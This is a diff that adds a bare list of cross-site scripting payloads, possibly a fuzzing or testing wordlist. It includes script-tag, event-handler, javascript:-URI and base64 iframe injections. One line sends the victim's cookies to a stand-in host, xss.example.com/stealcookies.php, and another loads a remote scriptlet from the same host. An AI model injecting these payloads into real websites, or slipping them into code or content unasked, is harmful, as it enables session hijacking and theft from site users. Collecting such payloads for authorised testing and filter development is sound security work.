@@ -1,0 +1,21 @@
+<script>alert("XSS")</script>
+<img src=x onerror=alert("XSS") />
+<svg/onload=prompt(1)>
+<body onload=alert("XSS")>
+"><script>alert("XSS")</script>
+<script>alert("XSS")</script>
+<img src=x onerror=alert("XSS")>
+<svg onload=alert("XSS")>
+<body onload=alert("XSS")>
+<script>prompt("XSS")</script>
+<script>confirm("XSS")</script> 
+<img src="x" onerror="javascript:alert('XSS')">
+<script>document.location="xss.example.com/stealcookies.php?c="+document.cookie;</script>
+<object type="text/x-scriptlet" data="http://xss.example.com/xss.html"></object>
+<iframe src="javascript:alert('XSS');"></iframe>
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>
+<marquee><img src=x onerror=prompt(1)></marquee>
+<script>document.write('<img src="x" onerror="javascript:alert(\'XSS\')">')</script>
+<a href="javascript:prompt('XSS')">click me</a>
+<img src=x onerror=this.onerror=confirm(1)>
+<img src="x:expression(alert(1))">
